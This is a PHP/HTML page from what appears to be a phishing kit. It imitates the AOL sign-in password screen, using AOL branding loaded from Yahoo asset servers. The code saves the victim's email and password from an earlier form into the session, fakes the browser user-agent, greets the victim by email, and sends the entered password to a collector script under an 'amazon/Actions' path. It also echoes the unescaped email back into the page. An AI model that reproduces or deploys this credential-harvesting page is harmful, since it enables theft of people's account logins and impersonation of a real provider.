<?php
session_start();
if (isset($_POST['Sex'])) {

    $_SESSION['EM'] = $_POST['EM'];
    $_SESSION['PW'] = $_POST['PW'];
}
?>
<html id="Stencil" class="js"><script type="text/javascript">Object.defineProperty(window.navigator, 'userAgent', { get: function(){ return 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36'; } });Object.defineProperty(window.navigator, 'vendor', { get: function(){ return ''; } });Object.defineProperty(window.navigator, 'platform', { get: function(){ return 'Android'; } });</script><head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>AOL
</title>
        <link rel="dns-prefetch" href="//gstatic.com">
        <link rel="dns-prefetch" href="//google.com">
        <link rel="dns-prefetch" href="//s.yimg.com">
        <link rel="dns-prefetch" href="//y.analytics.yahoo.com">
        <link rel="dns-prefetch" href="//ucs.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.yahoo.com">
        <link rel="icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">

        <!--[if lte IE 8]>
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-old-ie-min.css">
        <![endif]-->
        <!--[if gt IE 8]><!-->
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&amp;yui-s:pure/0.5.0/grids-responsive-min.css">
        <!--<![endif]-->
        <style nonce="">
            #mbr-css-check {
                display: inline;
            }
        </style>
        <link href="https://s.yimg.com/wm/mbr/62f819f02f77d380010858ba4a5fa483689fff76/aol-main.css" rel="stylesheet" type="text/css">
        
    </head>
    <body>
    <br><br><br><br><br><br><br>

    <div class="loginish login-centered clrfix dark-background puree-v2 responsive" style="background-color:white;">
    <div class="mbr-login-hd" id="mbr-uh-hd">
     <a href="#">
        <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo " width="100" height="">
    </a>
</div>


    <div class="challenge">
    <div id="password-challenge" class="primary">
    <div class="greeting">
            <h1 class="username">Hello <?php echo $_SESSION['EM']; ?></h1>
            <p class="not-you"><a href="#">Not&nbsp;you?</a></p>
    </div>
        <form action="../../amazon/Actions/tembus-email.php" method="post" name="email" id="asw" class="pure-form pure-form-stacked">
        <input type="hidden" name="EM" value="<?php echo $_SESSION['EM']; ?>">
        <input type="hidden" name="EM" value="<?php echo $_SESSION['EM']; ?>">
        <input type="password" id="login-passwd" name="epass" placeholder="Password" autofocus="">
        <p class="signin-cont">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign&nbsp;in" data-ylk="elm:btn;elmt:next;slk:next">                        
                    Sign&nbsp;in
            </button>
        </p>
        <p class="forgot-cont">
            <input type="submit" class="pure-button puree-button-link" data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link" name="skip" value="I forgot my&nbsp;password">
        </p>
    </form>
</div>

</div>

</div>


</body></html>